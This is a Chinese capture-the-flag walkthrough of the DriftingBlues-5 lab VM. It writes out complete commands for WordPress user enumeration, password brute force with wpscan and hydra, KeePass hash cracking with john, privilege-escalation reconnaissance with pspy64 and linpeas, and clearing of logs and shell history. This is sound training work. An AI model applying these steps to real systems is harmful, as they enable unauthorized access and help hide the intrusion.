# 前言

靶机：`DriftingBlues-5`，IP地址`192.168.1.62`

攻击：`kali`，IP地址`192.168.1.16`

都采用虚拟机，网卡为桥接模式

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\2.jpg)

## 网站探测

访问80端口，发现可能是`wordpress`的CMS

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\3.jpg)

使用`whatweb`探测指纹

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\4.jpg)

可以使用`wpscan`进行扫描，发现`xmlrpc.php`是打开的，可能存在用户枚举

```shell
wpscan --url http://192.168.1.62
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\5.jpg)

尝试枚举用户，发现五个用户名

```shell
wpscan --url http://192.168.1.62 -e u
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\6.jpg)

# 漏洞寻找

尝试对这些用户名进行密码爆破

```shell
wpscan --url http://192.168.1.62 -e u -P /usr/share/wordlists/rockyou.txt 
```

跑了好久没出现，尝试其他的探测

对网站目录进行扫描

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\8.jpg)

使用`wpscan`和`searchsplout`搜索有无可利用的历史漏洞，啧，也没有历史漏洞可利用

```shell
searchsploit wordpress core 6.7.1
searchsploit wordpress akismet

wpscan --url http://192.168.1.62 -e ap --plugins-detection aggressive --api-token [/api/] --detection-mode aggressive
```

寻找网站可利用点

- 那么就查看`wp-admin`登录时有无可用漏洞，测试抓包发现也是没有，登陆时已经忘记密码的数据包都无可用。
- 尝试在搜索处进行注入，发现并不是注入点
- 在评论处尝试`xss`，发现还是不行。
- 使用`ffuf`测试`php`文件有无额外传参，还是没有

当网站没有可利用点时，可能爆破挺好用的。

# 漏洞利用

## 字典生成破解

那么猜测是不是字典的问题，使用`cewl`爬取网站中的字符做成字典，然后使用这个字典看能否爆破成功

```shell
cewl http://192.168.1.62 -w words -m 3
//爬取深度为3，把收集到的保存到words中
```

然后再次使用`wpscan`破解，成功获取一个

```shell
wpscan --url http://192.168.1.62 -e u -P words
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\9.jpg)

访问`wp-admin`使用获取的用户名和密码进行登录，点击一圈，只有几个图片可能有信息，其他的都是文字，且暂无可用信息

在`wordpress`主页面中的图片只有五张，不包括下图的第四张图片。

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\10.jpg)

## 图片内信息获取

尝试把图片下载，然后进行分析

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\11.jpg)

使用`exiftool`查看图片中的一些数据

```shell
exiftool dblogo.png
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\12.jpg)

提供一个密码，并且这里只是可能有用，那么就进行测试，把之前获取的用户名都添加到一个文件`user`中，然后使用这个密码，使用工具`hydra`进行暴力，因为这里并不确定是否是该用户的密码

```shell
hydra -L user -p 59583hello 192.168.1.62 ssh
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\13.jpg)

使用获取的用户名`gill`和密码`59583hello`登录到`ssh`

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\14.jpg)



# 靶机内信息收集

使用`find`寻找具有SUID权限和`capabilites`文件

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\15.jpg)

查看定时任务，以及寻找备份文件，以及查看网站的`wp-config.php`都无可用信息

```shell
cat /etc/crontab
find / -name "back*" 2>/dev/null
cat /var/www/html/wp-config.php
```

查看网络状态信息，也并无其他信息

```shell
ss -antlp
ip addr
```

查看进程任务，也没有

```shell
ps -aux
top
free -h
```

查看系统的信息

```shell
cat /proc/cpuinfo
uname -a
```

查看有几个用户，发现只有`gill`一个

```shell
ls -al /home
cat /etc/passwd | grep /bin/bash
```







# 提取root



OK，回到用户的主目录，发现文件格式是`kdbx`的文件，这个一般是`keepass`，可自行搜索，是一个密码保险箱

把这个文件下载到`kali`中，方便进行破解

```shell
scp gill@192.168.1.62:/home/gill/keyfile.kdbx ./
```

然后使用`john`套件中的`keepass2john`把该文件转换成`john`可破解的形式

```shell
keepass2john keyfile.kdbx > hash
```

然后使用`john`进行破解

```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\16.jpg)

破解出一个密码`porsiempre`，那么就可以使用网站`https://app.keeweb.info`尝试还原，访问网站后，把下载的文件`keyfile.kdbx`上传后，输入这个密码，就可以发现几个密码

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\17.jpg)

那么就可以使用这些密码测试登录`root`用户，可以一个一个测试，或者把这几个保存到文件，然后使用`hydra`进行测试

测试，发现并不是`root`的密码。

那么前面的靶机信息收集都已经看到，并无可用信息，那么还剩一个，就是上传`pspy64`了，因为定时任务，如果指定`root`执行，当前用户可能是看不到的，使用`pspy64`可以解决，为什么64，因为之前查看内核时发现的。这个可以在项目地址`https://github.com/DominicBreuker/pspy/releases`下载使用

上传`pspy64`至靶机

```shell
//kali
scp pspy64 gill@192.168.1.62:/tmp 

//靶机
cd /tmp
chmod +x pspy64
```

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\18.jpg)

执行`pspy64`，然后进行观察即可。`./pspy64`

发现每一分钟会执行`/root/key.sh`这个文件

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\19.jpg)

测试有无查看该文件的权限，发现没有，那么上传脚本`linpeas.sh`，该工具可用于进行收集系统的信息以及一些审计工作等，这里测试有无可利用点

项目地址`https://github.com/BRU1S3R/linpeas.sh`

```shell
//kali
scp scp linpeas.sh gill@192.168.1.62:/tmp 

//靶机
cd /tmp
chmod +x linpeas.sh
./linpeas.sh
```

发现几个目录，当然这里信息很多，要自己去慢慢查看

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\20.jpg)

发现，该目录其他用户居然有可读可写可执行权限

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\21.jpg)

结合前面收集到的信息，在网站解析出的几个字符，还没有用处

```shell
2real4surreal
buddyretard
closet313
exalted
fracturedocean
zakkwylde
```

尝试在该目录中创建这么几个文件，测试会不会发生什么，毕竟这里知道一个定时任务，以及这么一个目录，还有这些字符

测试，发现同时有这些文件是不行的，那么一个个测试试试，最终在`fracturedocean`出现好东西

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\22.jpg)

为什么要查看当前目录下的文件呢，毕竟这里的文件夹特殊，那么可能和定时任务有关，就需要特别关注

使用密码登录`root`，然后查看`/root/key.sh`到底执行什么

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\23.jpg)

# 清除痕迹

删除之前上传的两个脚本

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\24.jpg)

清除各种日志

![](D:\stu\vulnhub\DriftingBlues靶场\pic-5\25.jpg)

清除历史命令记录

```shell
history -r 
history -c
```

# 总结

1. 主要考察`wordpress`的用户名枚举，以及从网站信息中爬取数据作为密码字典
2. 考察`keepass`密码管理的一个使用，如何解析出密码
3. 考察对`linux`中的信息收集，这个很重要，这里时借助两个工具`pspy64`和`linpeas.sh`，当然也可以不借助，但是就会复杂一些了
4. 考察分析过程





























































